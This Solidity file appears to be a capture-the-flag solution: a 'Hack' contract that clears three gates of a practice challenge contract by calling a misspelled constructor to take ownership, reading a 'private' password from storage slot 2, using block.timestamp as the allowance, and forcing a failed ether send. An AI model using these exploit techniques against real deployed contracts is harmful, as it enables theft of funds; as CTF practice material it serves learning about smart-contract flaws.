// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGate{
  function owner() external view returns (address);
  function entrant() external view returns (address);

  function construct0r() external;
  function createTrick() external;
  function getAllowance(uint) external;
  function enter() external;
}

// create contract
// createTrick()
// check SimpleTrick password at storage slot[2]
  // await web3.eth.getStorageAt("SimpleTrick_Address", 2);
  // '0x0000000000000000000000000000000000000000000000000000000065201448'
  // password = 1696601160
// call pwn() with password
// OR pass in block.timestamp immediately after createTrick()
contract Hack{
  function pwn(address _target) public payable{
    IGate gate = IGate(_target);

    // gateOne
    // msg.sender == owner 
    // tx.origin != owner <- tx.origin = EOA
    // set this contract as owner
    gate.construct0r();

    // gateTwo
    // allowEntrance == true
    // initiallize SimpleTrick
    gate.createTrick();
    gate.getAllowance(block.timestamp);

    // gateThree
    // gate balance > 0.001 ether && payable(owner).send(0.001 ether) == false
    (bool success, ) = address(gate).call{value: 0.002 ether}("");
    require(success, "send ether failed");

    gate.enter();
    require(gate.entrant() == msg.sender, "entry failed");

    selfdestruct(payable(msg.sender));
  }
}
